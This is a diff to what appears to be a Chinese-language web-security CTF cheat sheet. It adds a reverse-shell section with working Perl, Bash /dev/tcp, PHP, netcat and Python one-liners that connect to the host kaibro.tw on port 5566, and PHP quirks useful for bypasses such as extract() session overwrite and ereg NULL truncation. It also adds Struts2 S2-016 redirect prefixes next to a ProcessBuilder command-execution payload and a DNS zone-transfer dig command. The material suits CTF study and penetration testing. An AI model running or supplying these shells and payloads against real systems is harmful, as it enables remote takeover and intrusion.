@@ -87,6 +87,28 @@ A=fl;B=ag;cat $A$B
 ?>  
 ```
 
+
+## Reverse Shell
+
+- 本機Listen Port
+    - `ncat -vl 5566`
+
+- Perl
+    - `perl -e 'use Socket;$i="kaibro.tw";$p=5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
+
+- Bash
+    - `bash -i >& /dev/tcp/kaibro.tw/5566 0>&1`
+
+- PHP
+    - `php -r '$sock=fsockopen("kaibro.tw",5566);exec("/bin/sh -i <&3 >&3 2>&3");'`
+
+- NC
+    - `nc -e /bin/sh kaibro.tw 5566`
+
+- Python
+    - `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("kaibro.tw",5566));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+
+
 # PHP Tag
 
 - `<? ?>`
@@ -130,6 +152,60 @@ A=fl;B=ag;cat $A$B
     - `$a + $b == "579";`
     - `$a . $b == "123456"`
 
+- `$a = 0; $b = 'x';`
+    - `$a == false` => true
+    - `$a == $b` => true
+    - `$b == true` => true
+
+- `$a = 'a'`
+    - `++$a` => `'b'`
+    - `$a+1` => `1`
+
+
+# PHP 其他特性
+
+## Overflow
+
+- 32位元
+    - `intval('1000000000000')` => `2147483647`
+- 64位元
+    - `intval('100000000000000000000')` => `9223372036854775807`
+
+## 浮點數精度
+
+- `php -r "var_dump(1.000000000000001 == 1);"`
+    - false
+
+- `php -r "var_dump(1.0000000000000001 == 1);"`
+    - true
+
+- `$a = 0.1 * 0.1; var_dump($a == 0.01);`
+    - false
+
+## ereg會被NULL截斷
+
+- `var_dump(ereg("^[a-zA-Z0-9]+$", "1234\x00-!@#%"));`
+    - `1`
+
+## intval四捨五入
+
+- `var_dump(intval('5278.8787'));`
+    - `5278`
+
+## extract變數覆蓋
+
+- `extract($_GET);`
+    - `.php?_SESSION[name]=admin`
+    - `echo $_SESSION['name']` => 'admin'
+
+## is_numeric
+
+- `is_numeric(" \t\r\n 123");` => `1`
+
+## 其他
+
+- `echo (true ? 'a' : false ? 'b' : 'c');`
+    - `b`
 
 
 # Command Injection
@@ -675,6 +751,7 @@ http://[::]
 - 常見例子
     - Struts2
         - S2-016
+            - `action:`、`redirect:`、`redirectAction:`
             - `index.do?redirect:${new java.lang.ProcessBuilder(‘id’).start()}`
     - ElasticSearch
         - default port: `9200`
@@ -788,7 +865,7 @@ xxe.dtd: `<!ENTITY b SYSTEM "file:///etc/passwd">`
 
 ## Out of Band (OOB) XXE
 
-- Blind
+- Blind 無回顯
 
 ```xml
 <?xml version="1.0"?>
@@ -864,6 +941,11 @@ xxe.dtd:
     - `() { :; }; echo vulnerable`
 
 - X-forwarded-for
+
+- DNS Zone Transfer
+    - `dig @1.2.3.4 abc.com axfr`
+        - DNS Server: `1.2.3.4`
+        - Test Domain: `abc.com`
 
 - NodeJS unicode failure
     - `ＮＮ` => `..`
